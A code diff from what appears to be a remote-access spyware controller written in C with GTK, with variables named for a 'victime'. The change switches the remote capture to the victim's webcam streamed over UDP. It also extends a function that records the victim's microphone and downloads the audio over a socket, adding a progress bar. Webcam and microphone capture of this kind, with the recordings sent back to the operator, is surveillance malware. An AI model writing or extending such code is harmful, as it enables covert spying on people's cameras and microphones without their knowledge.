@@ -44,7 +44,7 @@ void cb_watch_remote_desktop(GtkButton *button, gpointer user_data)
 
     //const gchar *command_victime_temp = "gst-launch-1.0 -v ximagesrc use-damage=false xname=/usr/lib/torcs/torcs-bin ! videoconvert ! videoscale ! video/x-raw,format=I420,width=1440,height=810,framerate=30/1 ! jpegenc ! rtpjpegpay ! udpsink ";
 
-    const gchar *command_victime_temp = "gst-launch-1.0 -v ximagesrc use-damage=false xname=/usr/lib/torcs/torcs-bin ! videoconvert ! videoscale ! video/x-raw,format=I420,width=1440,height=900,framerate=30/1 ! jpegenc ! rtpjpegpay ! udpsink ";
+    const gchar *command_victime_temp = "gst-launch-1.0 -v v4l2src ! videoconvert ! videoscale ! video/x-raw,format=I420,width=1440,height=900,framerate=30/1 ! jpegenc ! rtpjpegpay ! udpsink ";
 
     gchar *final_victime_cmd = NULL;
 
@@ -590,6 +590,10 @@ void cb_record_micro(GtkButton *button, gpointer user_data)
     long tailleBlockRecut = 0;
     long data_len = 0;
     long totalRcv = 0;
+    
+    GtkWidget *progress_bar_micro = NULL;
+    GtkWidget *pbar_hbox = NULL;
+    gdouble step_foreward  = 0.0;
       
     GtkTextBuffer *text_buffer = NULL;
     gchar *text = NULL;
@@ -612,14 +616,16 @@ void cb_record_micro(GtkButton *button, gpointer user_data)
     }
 
     time_of_rec_dialog = gtk_dialog_new_with_buttons("How many time you want to record ? (1000 ~ 10sec / max 60 000)", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_OK, GTK_RESPONSE_OK, NULL);
-
     gtk_widget_set_size_request(time_of_rec_dialog, 500, 100);
 
     time_of_rec_entry  = gtk_entry_new_with_max_length(8);
-
     gtk_box_pack_start(GTK_BOX(GTK_DIALOG(time_of_rec_dialog)->vbox), time_of_rec_entry, TRUE, FALSE, 0);
-
-
+     
+    pbar_hbox = gtk_hbox_new(TRUE, 0);
+    progress_bar_micro = gtk_progress_bar_new();
+    gtk_widget_set_size_request(progress_bar_micro, 130, 10);
+    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(time_of_rec_dialog)->vbox), progress_bar_micro, TRUE, FALSE, 0);
+  
     gtk_widget_show_all(GTK_DIALOG(time_of_rec_dialog)->vbox);
     switch(gtk_dialog_run(GTK_DIALOG(time_of_rec_dialog)))
     {
@@ -672,8 +678,6 @@ void cb_record_micro(GtkButton *button, gpointer user_data)
     final_victime_cmd = strncpy(final_victime_cmd, command_victime_temp, len_cmd);
     final_victime_cmd = strncat(final_victime_cmd, time_of_record, strlen(time_of_record));
     final_victime_cmd = strncat(final_victime_cmd, " ! wavenc ! filesink location=output.wav", 40);
-
-    gtk_widget_destroy(time_of_rec_dialog);
 
     len_final_cmd = strlen(final_victime_cmd) + 1;
 
@@ -772,7 +776,8 @@ void cb_record_micro(GtkButton *button, gpointer user_data)
     }
 
     printf("le fichier fait : %ld octets\n\n", data_len);
-
+    
+    gtk_grab_add(progress_bar_micro);
     do
     {
         tailleBlockRecut = recv(sock, buffer, sizeof(data_len), 0);
@@ -780,12 +785,39 @@ void cb_record_micro(GtkButton *button, gpointer user_data)
         fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, record);
 
         totalRcv += tailleBlockRecut;
+        
+        step_foreward = ((gdouble)totalRcv * 1.0) / (gdouble)data_len;
 
-        //printf("Dowlading : %.2f Mo\n", (double)totalRcv / 1000000);
+        if(step_foreward > 1.0)
+            step_foreward = 0.0;
+        
+        gtk_progress_bar_set_fraction(GTK_PROGRESS_BAR(progress_bar_micro), step_foreward);
+        gtk_main_iteration();
 
     }while(totalRcv < data_len);
+    
+    gtk_grab_remove(progress_bar_micro);
 
     printf("Reception du fichier audio success : %ld !!\n", totalRcv);
+    
+    gtk_widget_destroy(time_of_rec_dialog);
+    
+    /** Obtaining the buffer associated with the widget. **/
+    text_buffer = gtk_text_view_get_buffer((GtkTextView*)text_view);
+
+    /** Set the default buffer text. **/
+    gtk_text_buffer_set_text(text_buffer, "Audio File have been downloaded ...", -1);
+
+    /** Obtain iters for the start and end of points of the buffer **/
+    gtk_text_buffer_get_start_iter(text_buffer, &start);
+    gtk_text_buffer_get_end_iter(text_buffer, &end);
+
+    /** Get the entire buffer text. **/
+    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);
+
+    /** Print the text **/
+    g_print("%s", text);
+    g_free(text);
 
     /* unused parameters */
     (void)button;
